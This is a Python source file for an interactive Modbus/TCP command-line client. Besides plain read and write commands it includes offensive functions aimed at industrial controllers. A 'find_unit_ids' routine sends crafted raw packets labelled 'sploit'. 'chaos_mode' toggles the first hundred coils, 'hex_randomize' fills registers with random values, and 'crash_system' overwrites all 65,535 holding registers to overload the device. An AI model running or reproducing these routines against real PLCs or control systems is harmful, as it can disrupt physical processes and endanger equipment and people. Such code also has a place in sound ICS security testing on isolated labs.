# Created by PlayerFridei
# Version 0.3.5 Early Testing

import sys
import logging
import random
import readline
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException, ModbusIOException
from prettytable import PrettyTable
import socket
import time
import shtab
from argparse import ArgumentParser
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor

# Initialize colorama
init()

# Configure logging
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

current_unit_id = 1

def set_unit_id(unit_id):
    global current_unit_id
    current_unit_id = unit_id
    print(Fore.GREEN + f"Current Unit ID set to {unit_id}" + Style.RESET_ALL)

def try_methods(client, methods):
    for method in methods:
        try:
            result = method()
            if result is not None:
                return result
        except (ModbusException, ModbusIOException) as e:
            logging.error(f"Exception while trying method {method.__name__}: {e}")
    return []

def read_coils(client, address, count):
    methods = [
        lambda: client.read_coils(address, count, unit=current_unit_id).bits
    ]
    return try_methods(client, methods) or [None] * count

def read_discrete_inputs(client, address, count):
    methods = [
        lambda: client.read_discrete_inputs(address, count, unit=current_unit_id).bits
    ]
    return try_methods(client, methods) or [None] * count

def read_holding_registers(client, address, count):
    methods = [
        lambda: client.read_holding_registers(address, count, unit=current_unit_id).registers
    ]
    return try_methods(client, methods) or [None] * count

def read_input_registers(client, address, count):
    methods = [
        lambda: client.read_input_registers(address, count, unit=current_unit_id).registers
    ]
    return try_methods(client, methods) or [None] * count

def write_coil(client, address, value):
    try:
        result = client.write_coil(address, value, unit=current_unit_id)
        if result.isError():
            logging.error(f"Failed to write coil: {result}")
        else:
            print(Fore.GREEN + f"Written coil at address {address} to {value}" + Style.RESET_ALL)
    except ModbusException as e:
        logging.error(f"Exception while writing coil: {e}")

def write_register(client, address, value):
    try:
        result = client.write_register(address, value, unit=current_unit_id)
        if result.isError():
            logging.error(f"Failed to write register: {result}")
        else:
            print(Fore.GREEN + f"Written register at address {address} to {value}" + Style.RESET_ALL)
    except ModbusException as e:
        logging.error(f"Exception while writing register: {e}")

def write_multiple_coils(client, address, values):
    try:
        result = client.write_coils(address, values, unit=current_unit_id)
        if result.isError():
            logging.error(f"Failed to write multiple coils: {result}")
        else:
            print(Fore.GREEN + f"Written multiple coils starting at address {address}" + Style.RESET_ALL)
            # Verify the written values
            new_values = read_coils(client, address, len(values))
            if new_values and new_values == values:
                print(Fore.GREEN + f"Verified multiple coils starting at address {address}" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"Verification failed for multiple coils starting at address {address}" + Style.RESET_ALL)
    except ModbusException as e:
        logging.error(f"Exception while writing multiple coils: {e}")

def write_multiple_registers(client, address, values):
    try:
        result = client.write_registers(address, values, unit=current_unit_id)
        if result.isError():
            logging.error(f"Failed to write multiple registers: {result}")
        else:
            print(Fore.GREEN + f"Written multiple registers starting at address {address}" + Style.RESET_ALL)
            # Verify the written values
            new_values = read_holding_registers(client, address, len(values))
            if new_values and new_values == values:
                print(Fore.GREEN + f"Verified multiple registers starting at address {address}" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"Verification failed for multiple registers starting at address {address}" + Style.RESET_ALL)
    except ModbusException as e:
        logging.error(f"Exception while writing multiple registers: {e}")

def display_table(headers, data):
    table = PrettyTable(headers)
    table.max_width = 40  # Adjust this as necessary for better readability
    for row in data:
        table.add_row(row)
    print(table)

def message_parser(client):
    try:
        holding_registers = read_holding_registers(client, 0, 64)
        messages = []
        for reg in holding_registers:
            if 0 <= reg <= 0xFFFF:
                messages.append(chr(reg & 0xFF))
                messages.append(chr((reg >> 8) & 0xFF))
            else:
                messages.append('?')
        return ''.join(messages)
    except Exception as e:
        logging.error(f"Failed to parse messages: {e}")
        return "No messages found."

def grab_banner(client):
    try:
        banner_data = []

        # Try reading coils
        coils = read_coils(client, 0, 10) or ["Unsupported"]
        banner_data.append(["Coils", coils])

        # Try reading discrete inputs
        discrete_inputs = read_discrete_inputs(client, 0, 10) or ["Unsupported"]
        banner_data.append(["Discrete Inputs", discrete_inputs])

        # Try reading holding registers
        holding_registers = read_holding_registers(client, 0, 10) or ["Unsupported"]
        banner_data.append(["Holding Registers", holding_registers])

        # Try reading input registers
        input_registers = read_input_registers(client, 0, 10) or ["Unsupported"]
        banner_data.append(["Input Registers", input_registers])

        # Parse messages
        messages = message_parser(client)
        banner_data.append(["Messages", messages])

        # Display the banner information
        banner_table = PrettyTable()
        banner_table.field_names = ["Type", "Value"]
        banner_table.max_width = 40  # Adjust this as necessary for better readability
        for banner_type, values in banner_data:
            banner_table.add_row([banner_type, values])
        
        print(Fore.CYAN + "Banner Information:" + Style.RESET_ALL)
        print(banner_table)
    except Exception as e:
        logging.error(f"Failed to grab banner: {e}")

def advanced_banner(client):
    try:
        banner_data = []

        # Try reading coils
        coils = read_coils(client, 0, 10) or ["Unsupported"]
        banner_data.append(["Coils", coils])

        # Try reading discrete inputs
        discrete_inputs = read_discrete_inputs(client, 0, 10) or ["Unsupported"]
        banner_data.append(["Discrete Inputs", discrete_inputs])

        # Try reading holding registers
        holding_registers = read_holding_registers(client, 0, 10) or ["Unsupported"]
        banner_data.append(["Holding Registers", holding_registers])

        # Try reading input registers
        input_registers = read_input_registers(client, 0, 10) or ["Unsupported"]
        banner_data.append(["Input Registers", input_registers])

        # Parse messages
        messages = message_parser(client)
        banner_data.append(["Messages", messages])

        # Collect detailed information about each coil and register
        coil_descriptions = [f"Coil {i}: {'ON' if coils[i] else 'OFF'}" if i < len(coils) else "Unknown function" for i in range(10)]
        register_descriptions = [f"Holding Register {i} value: {holding_registers[i]}" if i < len(holding_registers) else "Unknown function" for i in range(10)]

        banner_data.append(["Coil Descriptions", coil_descriptions])
        banner_data.append(["Register Descriptions", register_descriptions])

        # Display the advanced banner information
        banner_table = PrettyTable()
        banner_table.field_names = ["Type", "Value"]
        banner_table.max_width = 40  # Adjust this as necessary for better readability
        for banner_type, values in banner_data:
            banner_table.add_row([banner_type, values])
        
        print(Fore.CYAN + "Advanced Banner Information:" + Style.RESET_ALL)
        print(banner_table)
    except Exception as e:
        logging.error(f"Failed to grab advanced banner: {e}")

def find_unit_ids(client):
    start = b"\x21\x00\x00\x00\x00\x06"
    theend = b"\x04\x00\x01\x00\x00"
    noll = b"\x00"

    active_unit_ids = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(probe_unit_id, client, unit_id, start, theend, noll) for unit_id in range(1, 255)]
        for future in futures:
            result = future.result()
            if result:
                active_unit_ids.append(result)
    
    return active_unit_ids

def probe_unit_id(client, unit_id, start, theend, noll):
    sploit = start + unit_id.to_bytes(1, 'big') + theend
    try:
        client.connect()
        client.socket.sendall(sploit)
        data = client.socket.recv(12)
        client.close()

        if not data:
            data = noll * 4

        if data[:4] == b"\x21\x00\x00\x00":
            print(Fore.GREEN + f"Received: correct MODBUS/TCP from Unit ID {unit_id}" + Style.RESET_ALL)
            return unit_id
        else:
            print(Fore.YELLOW + f"Received: incorrect/none data from Unit ID {unit_id} (probably not in use)" + Style.RESET_ALL)
    except Exception as e:
        logging.error(f"Exception while probing Unit ID {unit_id}: {e}")
    return None

def enumerate_unit(client, unit_id):
    set_unit_id(unit_id)
    print(Fore.CYAN + f"Grabbing banner for Unit ID {unit_id}..." + Style.RESET_ALL)
    grab_banner(client)

def enumerate_units(client):
    print(Fore.CYAN + "Enumerating Unit IDs..." + Style.RESET_ALL)
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(enumerate_unit, client, unit_id) for unit_id in range(1, 255)]
        for future in futures:
            future.result()

def network_details(client, ip):
    try:
        server_info = socket.gethostbyaddr(ip)
        print(Fore.CYAN + f"Modbus Server Hostname: {server_info[0]}" + Style.RESET_ALL)
        print(Fore.CYAN + f"Modbus Server IP Address: {ip}" + Style.RESET_ALL)
        print(Fore.CYAN + f"Modbus Server Aliases: {', '.join(server_info[1])}" + Style.RESET_ALL)

        # Placeholder for additional details
        print(Fore.CYAN + "Modbus Server Version: Not Available" + Style.RESET_ALL)
        print(Fore.CYAN + "Additional Server Details: Not Available" + Style.RESET_ALL)

    except socket.herror as e:
        logging.error(f"Failed to get network details: {e}")
        print(Fore.RED + f"Failed to get network details: {e}" + Style.RESET_ALL)
    except socket.gaierror:
        print(Fore.CYAN + f"Modbus Server IP Address: {ip}" + Style.RESET_ALL)

def display_help():
    commands = [
        ["read_coils <address> <count>", "Read coils from the given address."],
        ["read_discrete_inputs <address> <count>", "Read discrete inputs from the given address."],
        ["read_holding_registers <address> <count>", "Read holding registers from the given address."],
        ["read_input_registers <address> <count>", "Read input registers from the given address."],
        ["write_coil <address> <value>", "Write a value to a coil at the given address."],
        ["write_register <address> <value>", "Write a value to a register at the given address."],
        ["write_multiple_coils <address> <values>", "Write multiple coils starting at the given address."],
        ["write_multiple_registers <address> <values>", "Write multiple registers starting at the given address."],
        ["display_all_coils", "Display the first 100 coils."],
        ["display_all_discrete_inputs", "Display the first 100 discrete inputs."],
        ["display_all_holding_registers", "Display the first 100 holding registers."],
        ["display_all_input_registers", "Display the first 100 input registers."],
        ["chaos_mode", "Alternate coil values in the first 100 coils."],
        ["network_details", "Show the network details of the Modbus server."],
        ["grab_banner", "Grab the banner of the Modbus server."],
        ["advanced_banner", "Grab a detailed banner of the Modbus server."],
        ["find_unit_ids", "Find active Modbus Unit IDs in the range 1 to 254."],
        ["enumerate", "Enumerate all Unit IDs and display their banners."],
        ["set_unit_id <unit_id>", "Set the current Unit ID to use for operations."],
        ["hex_modify <address> <hex_value>", "Modify register value at the given address."],
        ["hex_randomize <count>", "Randomize values in the given number of registers."],
        ["text_edit <text>", "Edit text in the first registers."],
        ["crash_system [speed]", "Overload the system with random data at the given speed (default: 0.01s)."],
        ["help", "Display the list of commands."],
        ["exit", "Exit the client."]
    ]
    for cmd, desc in commands:
        print(Fore.YELLOW + f"{cmd:<45} {desc}" + Style.RESET_ALL)
    print()

def hex_modify(client, address, hex_value):
    try:
        int_value = int(hex_value, 16)
        values = []
        while int_value > 0:
            values.append(int_value & 0xFFFF)
            int_value >>= 16

        for i, value in enumerate(values):
            write_register(client, address + i, value)
            print(Fore.GREEN + f"Written hex value {format(value, '04x')} to register at address {address + i}" + Style.RESET_ALL)
    except ValueError:
        print(Fore.RED + "Invalid hex value." + Style.RESET_ALL)

def hex_randomize(client, count):
    for i in range(count):
        random_value = random.randint(0, 0xFFFF)
        hex_value = format(random_value, '04x')
        write_register(client, i, random_value)
        print(Fore.GREEN + f"Randomized register at address {i} with hex value {hex_value}" + Style.RESET_ALL)
        time.sleep(0.1)
    logging.info("Hex Randomize mode activated.")

def string_to_hex_list(text):
    hex_list = []
    for char in text:
        hex_value = format(ord(char), '04x')
        hex_list.append(hex_value)
    return hex_list

def text_edit(client, text):
    hex_list = string_to_hex_list(text)
    for i, hex_value in enumerate(hex_list):
        int_value = int(hex_value, 16)
        try:
            write_register(client, i, int_value)
            print(Fore.GREEN + f"Written character '{chr(int_value)}' as hex value {hex_value} to register at address {i}" + Style.RESET_ALL)
            time.sleep(0.1)
        except ModbusException as e:
            logging.error(f"Exception while writing in text_edit at address {i}: {e}")
    logging.info("Text edit mode activated.")

def crash_system(client, speed=0.01):
    max_registers = 65535
    for i in range(max_registers):
        random_value = random.randint(0, 0xFFFF)
        hex_value = format(random_value, '04x')
        random_unit_id = random.randint(1, 254)
        try:
            write_register(client, i, random_value)
            print(Fore.RED + f"Written random value {random_value} (hex {hex_value}) to register at address {i}" + Style.RESET_ALL)
        except ModbusException as e:
            logging.error(f"Exception while writing in crash_system at address {i}: {e}")
        time.sleep(speed)
    logging.info("Crash system activated: System overloaded with random data.")

def main():
    parser = ArgumentParser()
    shtab.add_argument_to(parser, ["-s", "--shtab"])
    parser.add_argument("ip", help="IP address of the Modbus server")
    parser.add_argument("port", type=int, help="Port of the Modbus server")
    args = parser.parse_args()

    client = ModbusTcpClient(args.ip, args.port)
    if not client.connect():
        logging.error(f"Failed to connect to Modbus server at {args.ip}:{args.port}")
        sys.exit(1)

    print(Fore.CYAN + "Connected to Modbus server." + Style.RESET_ALL)
    print(Fore.YELLOW + "Type 'help' for a list of commands." + Style.RESET_ALL)

    while True:
        try:
            command = input(Fore.CYAN + "modbus> " + Style.RESET_ALL).strip().split()
            if len(command) == 0:
                continue

            cmd = command[0].lower()

            if cmd == "exit":
                break
            elif cmd == "read_coils":
                if len(command) != 3:
                    print(Fore.RED + "Usage: read_coils <address> <count>" + Style.RESET_ALL)
                    continue
                address, count = int(command[1]), int(command[2])
                coils = read_coils(client, address, count)
                display_table(["Address", "Value"], [[i + address, v] for i, v in enumerate(coils)])
            elif cmd == "read_discrete_inputs":
                if len(command) != 3:
                    print(Fore.RED + "Usage: read_discrete_inputs <address> <count>" + Style.RESET_ALL)
                    continue
                address, count = int(command[1]), int(command[2])
                inputs = read_discrete_inputs(client, address, count)
                display_table(["Address", "Value"], [[i + address, v] for i, v in enumerate(inputs)])
            elif cmd == "read_holding_registers":
                if len(command) != 3:
                    print(Fore.RED + "Usage: read_holding_registers <address> <count>" + Style.RESET_ALL)
                    continue
                address, count = int(command[1]), int(command[2])
                registers = read_holding_registers(client, address, count)
                display_table(["Address", "Value"], [[i + address, v] for i, v in enumerate(registers)])
            elif cmd == "read_input_registers":
                if len(command) != 3:
                    print(Fore.RED + "Usage: read_input_registers <address> <count>" + Style.RESET_ALL)
                    continue
                address, count = int(command[1]), int(command[2])
                registers = read_input_registers(client, address, count)
                display_table(["Address", "Value"], [[i + address, v] for i, v in enumerate(registers)])
            elif cmd == "write_coil":
                if len(command) != 3:
                    print(Fore.RED + "Usage: write_coil <address> <value>" + Style.RESET_ALL)
                    continue
                address, value = int(command[1]), bool(int(command[2]))
                write_coil(client, address, value)
                # Verify the written value
                new_value = read_coils(client, address, 1)
                if new_value and new_value[0] == value:
                    print(Fore.GREEN + f"Verified coil at address {address} is set to {value}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Verification failed for coil at address {address}" + Style.RESET_ALL)
            elif cmd == "write_register":
                if len(command) != 3:
                    print(Fore.RED + "Usage: write_register <address> <value>" + Style.RESET_ALL)
                    continue
                address, value = int(command[1]), int(command[2])
                write_register(client, address, value)
                # Verify the written value
                new_value = read_holding_registers(client, address, 1)
                if new_value and new_value[0] == value:
                    print(Fore.GREEN + f"Verified register at address {address} is set to {value}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Verification failed for register at address {address}" + Style.RESET_ALL)
            elif cmd == "write_multiple_coils":
                if len(command) < 3:
                    print(Fore.RED + "Usage: write_multiple_coils <address> <values>" + Style.RESET_ALL)
                    continue
                address = int(command[1])
                values = [bool(int(v)) for v in command[2:]]
                write_multiple_coils(client, address, values)
            elif cmd == "write_multiple_registers":
                if len(command) < 3:
                    print(Fore.RED + "Usage: write_multiple_registers <address> <values>" + Style.RESET_ALL)
                    continue
                address = int(command[1])
                values = [int(v) for v in command[2:]]
                write_multiple_registers(client, address, values)
                # Verify the written values
                new_values = read_holding_registers(client, address, len(values))
                if new_values and new_values == values:
                    print(Fore.GREEN + f"Verified multiple registers starting at address {address}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Verification failed for multiple registers starting at address {address}" + Style.RESET_ALL)
            elif cmd == "display_all_coils":
                display_table(["Address", "Value"], [[i, v] for i, v in enumerate(read_coils(client, 0, 100))])
            elif cmd == "display_all_discrete_inputs":
                display_table(["Address", "Value"], [[i, v] for i, v in enumerate(read_discrete_inputs(client, 0, 100))])
            elif cmd == "display_all_holding_registers":
                display_table(["Address", "Value"], [[i, v] for i, v in enumerate(read_holding_registers(client, 0, 100))])
            elif cmd == "display_all_input_registers":
                display_table(["Address", "Value"], [[i, v] for i, v in enumerate(read_input_registers(client, 0, 100))])
            elif cmd == "chaos_mode":
                for i in range(100):
                    value = not bool(i % 2)
                    write_coil(client, i, value)
                    time.sleep(0.1)
                logging.info("Chaos mode activated: Alternated coil values.")
                display_table(["Address", "Value"], [[i, v] for i, v in enumerate(read_coils(client, 0, 100))])
            elif cmd == "network_details":
                network_details(client, args.ip)
            elif cmd == "grab_banner":
                grab_banner(client)
            elif cmd == "advanced_banner":
                advanced_banner(client)
            elif cmd == "find_unit_ids":
                active_ids = find_unit_ids(client)
                print(Fore.GREEN + f"Active Unit IDs: {active_ids}" + Style.RESET_ALL)
            elif cmd == "enumerate":
                enumerate_units(client)
            elif cmd == "set_unit_id":
                if len(command) != 2:
                    print(Fore.RED + "Usage: set_unit_id <unit_id>" + Style.RESET_ALL)
                    continue
                unit_id = int(command[1])
                set_unit_id(unit_id)
            elif cmd == "help":
                display_help()
            elif cmd == "hex_modify":
                if len(command) != 3:
                    print(Fore.RED + "Usage: hex_modify <address> <hex_value>" + Style.RESET_ALL)
                    continue
                address, value = int(command[1]), command[2]
                hex_modify(client, address, value)
                # Verify the written value
                new_value = read_holding_registers(client, address, 1)
                if new_value and format(new_value[0], '04x') == value:
                    print(Fore.GREEN + f"Verified register at address {address} is set to {value}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Verification failed for register at address {address}" + Style.RESET_ALL)
            elif cmd == "hex_randomize":
                if len(command) != 2:
                    print(Fore.RED + "Usage: hex_randomize <count>" + Style.RESET_ALL)
                    continue
                count = int(command[1])
                hex_randomize(client, count)
                # Verify the written values
                new_values = read_holding_registers(client, 0, count)
                print(Fore.GREEN + f"Randomized {count} registers." + Style.RESET_ALL)
            elif cmd == "text_edit":
                if len(command) < 2:
                    print(Fore.RED + "Usage: text_edit <text>" + Style.RESET_ALL)
                    continue
                text = ' '.join(command[1:])
                text_edit(client, text)
                # Verify the written values
                hex_values = string_to_hex_list(text)
                int_values = [int(hex_val, 16) for hex_val in hex_values]
                new_values = read_holding_registers(client, 0, len(int_values))
                if new_values and new_values == int_values:
                    print(Fore.GREEN + f"Verified text written to registers: {text}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Verification failed for text written to registers" + Style.RESET_ALL)
            elif cmd == "crash_system":
                speed = 0.01
                if len(command) == 2:
                    try:
                        speed = float(command[1])
                    except ValueError:
                        print(Fore.RED + "Invalid speed value. Using default speed 0.01s." + Style.RESET_ALL)
                crash_system(client, speed)
            else:
                print(Fore.RED + "Unknown command. Type 'help' for a list of commands." + Style.RESET_ALL)
        except KeyboardInterrupt:
            print("\nUse 'exit' command to disconnect from the Modbus server.")

    client.close()
    print(Fore.CYAN + "Disconnected from Modbus server." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
